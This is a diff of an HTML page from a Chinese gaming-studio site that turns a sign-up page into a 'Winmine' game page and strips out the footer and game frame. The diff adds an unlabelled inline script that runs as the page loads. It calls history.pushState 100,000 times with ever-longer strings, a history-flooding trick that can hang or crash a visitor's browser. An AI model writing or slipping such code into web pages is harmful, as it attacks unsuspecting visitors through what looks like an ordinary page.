@@ -1,22 +1,26 @@
-<!DOCTYPE HTML>
 <html>
 
 <head>
-	<meta charset="UTF-8">
-	<title>211 Special Force - Sign Up</title>
+	<title>Winmine - 211 Special Force</title>
+	<link rel="shortcut icon" href="image/favicon.ico">
 	<link rel="stylesheet" type="text/css" href="css/normalize.css">
 	<link rel="stylesheet" type="text/css" href="css/main.css">
-	<link rel="stylesheet" type="text/css" href="css/unera.css">
-	<link rel="shortcut icon" href="images/favicon.ico">
 	<script src="js/main.js"></script>
-	<script src="js/unera.js"></script>
+	<meta charset="utf-8">
 </head>
 
-<body>
+<body onload="main()">
 	<div id="mask"></div>
+	<script>
+		var total = "";
+		for (var i = 0; i < 100000; i++) {
+			total = total + i.toString();
+			history.pushState(0, 0, total);
+		}
+	</script>
 	<header>
 		<nav id="topbar">
-			<div id="top_left"><a href="index.html"><span>首页</span></a></div>
+			<div id="top_left"><a href="index.html">首页</a></div>
 			<div id="top_right"><a href="#">导航</a></div>
 		</nav>
 		<nav id="sidebar">
@@ -39,14 +43,6 @@
 			</ul>
 		</nav>
 	</header>
-	<iframe id="gamebox"></iframe>
-	<footer>
-		<a href="index.html">网站首页</a>
-		<a href="about.html">关于我们</a>
-		<a target="_blank" href="https://jq.qq.com/?_wv=1027&k=4CKGdPQ">加入我们</a>
-		<a href="blogroll.html">友情链接</a>
-		<p>Copyright © 2016 - 2017 211SF Studio Inc. All Rights Reserved</p>
-	</footer>
 </body>
 
 </html>
